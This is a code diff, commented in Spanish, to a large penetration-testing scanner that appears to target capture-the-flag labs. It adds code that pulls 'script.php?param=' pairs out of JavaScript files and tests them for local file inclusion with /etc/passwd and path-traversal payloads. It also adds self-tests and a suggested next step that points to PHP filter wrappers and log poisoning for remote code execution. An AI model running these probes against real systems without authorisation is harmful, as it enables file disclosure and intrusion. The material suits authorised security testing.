@@ -4454,6 +4454,55 @@ def _extract_emails_comments(body):
     return emails, comments
 
 
+# ('script.php?param=', ver abajo) — caso real: un .js minificado traía
+# n.p="http://vulnnet.thm/index.php?referer=" (construye la URL de un tracking
+# pixel/analytics en JS, con el valor real puesto en runtime por el propio código).
+# katana (-jc) no ejecuta JS, así que un string literal como ese nunca se visita
+# solo como URL — palantir solo la había tenido a la vista al leer el .js a mano.
+# 'referer' resultó ser un LFI de libro contra ese mismo index.php (confirmado:
+# ?referer=/etc/passwd devolvía el fichero). Ver _extract_js_params/_lfi_probe.
+_JS_PARAM_RX = re.compile(
+    r'(?:https?://[^/\s"\'<>]+)?([\w./-]*?[\w-]+\.(?:php|phtml|asp|aspx|jsp|cgi))\?([a-zA-Z_]\w*)=',
+    re.I)
+_LFI_PASSWD_RX = re.compile(r"root:.*:0:0:")
+# absoluto primero (sin prefijo/sufijo en el include()); si no, traversal clásico
+# (el include() antepone un directorio base) — 1-2 GETs de solo lectura por candidato.
+_LFI_PAYLOADS = ("/etc/passwd", "../" * 8 + "etc/passwd")
+
+
+def _extract_js_params(body):
+    """Pares (script, parámetro) referenciados DENTRO de un .js — p. ej. 'index.php?referer='
+    en un string literal de un bundle minificado. Candidatos a LFI/path traversal que katana
+    (no ejecuta JS) no visita por sí solo. Si el string trae un scheme://host absoluto (propio o
+    de terceros: un CDN, un tracker...), el host se DESCARTA a propósito y solo se queda la ruta
+    — _lfi_probe siempre prueba contra el objetivo que se está escaneando (urljoin con su base),
+    nunca contra un dominio ajeno solo porque aparezca citado dentro de un .js. Orden de aparición,
+    sin duplicados. Puro, testable sin red — _lfi_probe es quien de verdad confirma o descarta
+    cada candidato contra la red."""
+    seen = []
+    for m in _JS_PARAM_RX.finditer(body or ""):
+        pair = (m.group(1), m.group(2))
+        if pair not in seen:
+            seen.append(pair)
+    return seen
+
+
+def _lfi_probe(base_url, script, param, host=None, timeout=8):
+    """Confirma (nunca adivina) un LFI real para 'script?param=' descubierto dentro de un .js:
+    prueba /etc/passwd en claro y, si no, un traversal relativo clásico, y exige la firma REAL
+    de /etc/passwd en el cuerpo (no basta un 200 — evita el 200-a-todo de apps mal configuradas).
+    Devuelve (url_confirmada, payload) en el primer acierto, o None. Solo lectura, nunca escribe
+    nada en el objetivo."""
+    import urllib.parse
+    target = urllib.parse.urljoin(base_url, script)
+    for payload in _LFI_PAYLOADS:
+        probe = f"{target}?{param}={payload}"
+        status, _, body = _http_get(probe, host=host, timeout=timeout)
+        if status == 200 and _LFI_PASSWD_RX.search(body or ""):
+            return probe, payload
+    return None
+
+
 def _parse_katana_jsonl(out):
     """URLs/endpoints reales descubiertos por katana (jsonl, -or -ob: sin cuerpo/raw)
     + cuáles tenían formularios (-fx). Tolerante a líneas rotas/no-JSON (nunca lanza
@@ -4968,7 +5017,7 @@ def fp_web_slow(ip, p, res, whatweb_out, host, deep, hostname=None):
                 # 585KB de JSON sin esto) así que para emails/comentarios HTML hay
                 # que re-pedir las URLs descubiertas (acotado a 40) y pasarles regex
                 # — lo que hace ReconSpider con Scrapy, sin añadir esa dependencia.
-                all_emails, all_comments = set(), []
+                all_emails, all_comments, js_params = set(), [], []
                 for u in crawled["urls"][:40]:
                     _cst, _ch, cbody = _http_get(u)
                     em, co = _extract_emails_comments(cbody)
@@ -4976,6 +5025,10 @@ def fp_web_slow(ip, p, res, whatweb_out, host, deep, hostname=None):
                     for c in co:
                         if (u, c) not in all_comments:
                             all_comments.append((u, c))
+                    if u.split("?")[0].endswith(".js"):
+                        for pair in _extract_js_params(cbody):
+                            if pair not in js_params:
+                                js_params.append(pair)
                 if all_emails:
                     res["findings"].append(
                         ("media", f"Katana {port}: email(s) crawleados — {', '.join(sorted(all_emails)[:10])}"))
@@ -4983,6 +5036,22 @@ def fp_web_slow(ip, p, res, whatweb_out, host, deep, hostname=None):
                     res["findings"].append(
                         ("alta", f"Katana {port}: {len(all_comments)} comentario(s) HTML — " +
                                  "; ".join(f"{u}: {sanitize(c)[:150]}" for u, c in all_comments[:5])))
+                # LFI confirmado contra parámetros vistos DENTRO del JS (ver _extract_js_params):
+                # katana no ejecuta JS, así que 'script.php?param=' solo como string literal
+                # nunca se visita como URL por sí solo — caso real: index.php?referer= hallado
+                # leyendo un .js a mano, confirmado LFI con ?referer=/etc/passwd. Acotado a 20
+                # candidatos, 1-2 GETs de solo lectura cada uno, firma REAL de /etc/passwd exigida.
+                for script, param in js_params[:20]:
+                    hit = _lfi_probe(url, script, param, host=hostname)
+                    if hit:
+                        hit_url, payload = hit
+                        res["findings"].append(("critica",
+                            f"Katana {port}: LFI CONFIRMADO en '{script}' por el parámetro '{param}' "
+                            f"(visto en un .js, no por el crawling) — {hit_url}"))
+                        res["next"].append(
+                            f"curl -s '{hit_url}'   # LFI confirmado arriba — prueba wrappers PHP "
+                            f"(php://filter/convert.base64-encode/resource=...) para leer fuentes, "
+                            f"o log poisoning (access.log/mail/SSH) para RCE")
         else:
             res["missing"].append("katana")
 
@@ -14440,6 +14509,53 @@ def selftest():
     assert _extract_emails_comments("<!--\n  multilinea\n  de verdad\n-->")[1] == ["multilinea\n  de verdad"]
     assert _extract_emails_comments("sin nada de esto") == ([], [])
     assert _extract_emails_comments("a@b.com y a@b.com repetido")[0] == ["a@b.com"]  # dedup
+    # --crawl: parámetros (script, param) vistos DENTRO de un .js — katana (-jc) no ejecuta JS,
+    # así que un string literal como 'index.php?referer=' (base de una URL de tracking construida
+    # en runtime) nunca se visita por sí solo como URL en el crawling. Caso real: exactamente este
+    # patrón en un .js minificado de un lab resultó ser un LFI de libro. Ver _lfi_probe.
+    assert _extract_js_params('t)},n.p="http://vulnnet.thm/index.php?referer=",n(') == \
+        [("/index.php", "referer")]
+    assert _extract_js_params("sin nada de esto") == []
+    assert _extract_js_params("a.php?x=1 y luego otra vez a.php?x=2") == [("a.php", "x")]   # dedup
+    assert _extract_js_params("b.php?y=1 c.asp?z=2") == [("b.php", "y"), ("c.asp", "z")]
+    # host de TERCEROS citado dentro del .js (un CDN, un tracker...) → el host se descarta, solo
+    # queda la ruta: _lfi_probe nunca debe acabar probando contra ese dominio ajeno.
+    assert _extract_js_params('window.location="https://evil.example.com/track.php?referer="') == \
+        [("/track.php", "referer")]
+    # _lfi_probe: confirma con la firma REAL de /etc/passwd (nunca con un 200 vacío/200-a-todo).
+    # Prueba primero la ruta absoluta y, si no cuela, el traversal relativo — se para en el
+    # primer acierto (no gasta el 2º payload si el 1º ya confirmó).
+    _lfi_calls = []
+
+    def _fake_lfi_get(u, host=None, timeout=8, **kw):
+        _lfi_calls.append(u)
+        if u.endswith("?referer=/etc/passwd"):
+            return 200, {}, "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n"
+        return 200, {}, "<html>no encontrado</html>"
+
+    _real_http_get_lfi = _http_get
+    globals()["_http_get"] = _fake_lfi_get
+    try:
+        _hit = _lfi_probe("http://vulnnet.thm:80/", "index.php", "referer")
+    finally:
+        globals()["_http_get"] = _real_http_get_lfi
+    assert _hit == ("http://vulnnet.thm:80/index.php?referer=/etc/passwd", "/etc/passwd")
+    assert _lfi_calls == ["http://vulnnet.thm:80/index.php?referer=/etc/passwd"]
+    # sin ningún acierto real → None, habiendo probado AMBOS payloads
+    _lfi_calls2 = []
+    globals()["_http_get"] = lambda u, host=None, timeout=8, **kw: (_lfi_calls2.append(u), (200, {}, "nada aquí"))[1]
+    try:
+        assert _lfi_probe("http://x.com/", "a.php", "file") is None
+    finally:
+        globals()["_http_get"] = _real_http_get_lfi
+    assert len(_lfi_calls2) == 2
+    # un 200 que NO trae la firma exacta (p. ej. un WAF con 200-a-todo, o la palabra "root" suelta
+    # sin el patrón ':0:0:') tampoco cuela — nunca un falso positivo por un simple 200
+    globals()["_http_get"] = lambda u, host=None, timeout=8, **kw: (200, {}, "aquí pone root pero sin el patrón real")
+    try:
+        assert _lfi_probe("http://x.com/", "a.php", "file") is None
+    finally:
+        globals()["_http_get"] = _real_http_get_lfi
     _vh = [("x.local", [{"host": "app.x.local", "status": "-", "length": "-"},
                         {"host": "dev.x.local", "status": "-", "length": "-"}])]
     assert fp_vhost_web("10.0.0.1", [], _vh)["findings"] == []               # sin webs: no hay nada que fingerprintear
